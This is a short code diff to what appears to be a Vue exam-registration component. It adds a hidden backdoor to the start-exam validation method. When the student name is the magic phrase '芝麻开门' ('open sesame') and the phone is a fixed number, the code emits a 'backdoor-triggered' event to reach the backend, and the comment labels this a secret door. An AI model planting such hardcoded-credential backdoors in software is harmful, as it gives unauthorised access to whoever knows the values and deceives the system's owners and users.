@@ -288,6 +288,12 @@ export default {
     validateAndStartExam() {
       this.submitted = true;
       
+      // 检查是否是访问后台的暗门
+      if (this.userInfo.student_name === '芝麻开门' && this.userInfo.phone === '15088888888') {
+        this.$emit('backdoor-triggered');
+        return;
+      }
+      
       if (this.userInfo.student_name && this.isValidPhone && this.userInfo.organization) {
         this.loadQuestions();
       }
